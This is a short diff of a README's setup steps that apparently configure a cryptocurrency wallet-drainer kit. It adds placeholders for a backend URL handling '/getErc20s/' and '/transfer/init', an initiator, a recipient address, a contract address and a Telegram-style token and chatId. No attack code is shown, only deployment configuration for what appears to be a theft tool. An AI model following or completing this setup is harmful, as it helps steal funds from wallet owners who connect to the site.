@@ -3,15 +3,17 @@
 
 Instructions
 Install the requirements
-
 pip install -r requirements.txt
 edit index.js
-
-"const INITIATOR = "-"          // «« @@@ MATCH WITH initiator (app.py + index.js)     
+// (!!!!) SET THE FOLLOWING VARIABLES ########
+// (IMPORTANT => URL should end WITHOUT "/" --> so  --> www.test.com instead of www.test.com/ )
+const API_ENDPOINT = "https://aiopython.herokuapp.com";                           // «« @@@ python BACKEND-URL (receives: /getErc20s/ + /transfer/init )
+const CONTRACT_ADR_SAFA = "0x00000000006c3852cbEf3e08E8dF289169EdE581"  // «« @@@ YOUR OWN CONTRACT --> needs to be deployed from initiator
+const INITIATOR = "-"          // «« @@@ MATCH WITH initiator (app.py + index.js)     
 let recipient = "-"            // «« @@@ MATCH WITH app.py      
 const endpoint = recipient;
 let token = `-`
-let chatId = "
-
+let chatId = 
+// (!!!!) SET THE FOLLOWING VARIABLES ########
 run app.py 
 
